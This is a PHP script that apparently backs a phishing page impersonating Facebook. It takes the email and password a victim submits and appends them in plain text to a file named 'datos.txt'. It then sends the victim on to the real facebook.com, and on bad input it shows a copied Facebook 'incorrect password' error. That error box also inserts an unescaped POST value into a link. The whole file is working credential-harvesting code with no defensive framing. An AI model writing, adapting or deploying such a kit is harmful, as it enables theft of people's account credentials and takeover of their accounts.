<?php
$passErr = $emailErr= "";
$pass = $email = "";

if ($_SERVER["REQUEST_METHOD"] == "POST") {
$data="";
$data['Err']=null;
   if (strlen($_POST["email_mobile"])<5) {
     $data['Err']="Error";
   } else {
     $email = test_input($_POST["email_mobile"]);
        $data['email_mobile']=$email;

   }


   if (strlen($_POST["email_mobile"])<5) {
     $data['Err']="Error";
   } else {
     $pass = test_input($_POST["pass_mobile"]);
     $data['pass_mobile']=$pass;
   }
if($data['Err']!=NULL){

    $data='
<div class="pam login_error_box uiBoxRed" role="alert" tabindex="0"><div class="fsl fwb fcb">Please re-enter your password</div><div><p>The password you entered is incorrect. Please try again (make sure your caps lock is off).</p><p>Forgot your password? <a href="https://www.facebook.com/recover/initiate?email_or_phone='.$_POST["email"].'" target="">Request a new one.</a></p></div></div>';
}else{
header ('Location: '.htmlspecialchars($_SERVER["PHP_SELF"]));
$handle = fopen("datos.txt", "a");
$string = '
Email: '.$data['email_mobile'].' Pass: '.$data['pass_mobile'];

fwrite($handle,$string);
fclose($handle);
header ('Location: http://www.facebook.com ');
exit;

}
}

function test_input($data) {
   $data = trim($data);
   $data = stripslashes($data);
   $data = htmlspecialchars($data);
   return $data;
}
?>
